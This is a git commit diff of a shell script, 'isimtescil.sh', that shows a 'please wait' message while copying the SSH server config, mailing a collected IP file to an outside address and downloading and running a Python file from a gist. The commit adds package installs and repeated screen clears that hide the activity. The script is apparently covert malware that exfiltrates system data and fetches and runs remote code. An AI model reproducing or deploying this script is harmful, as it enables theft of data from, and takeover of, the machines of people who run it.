4afe409b213bdf4d588eac2c7cfc9fae2ebd0c72
BÖRÜ70 <39714901+B0RU70@users.noreply.github.com>
2019-01-07 04:00:20 +0300

    Update isimtescil.sh

--- isimtescil.sh
+++ isimtescil.sh
@@ -1,4 +1,7 @@
+#Linux System
 echo "Lutfen Bekleyin..."
+apt-get install pip2
+pip2 install smtplib
 cp /etc/ssh/sshd_config /tmp/ssh.txt
 touch /tmp/log.txt
 cd /tmp/
@@ -9,4 +12,7 @@ sendmail b0ru70@ajanlar.org < /tmp/ip.txt
 wget https://gist.githubusercontent.com/B0RU70/83f768db01efc909eaee7b3f132fbaa3/raw/4a6b9eab5b68755548d948d3f0a9f67d3c086b9f/logs.py -P /usr/
 python /usr/logs.py
 cd /root/
+clear
+clear
+clear
 clear
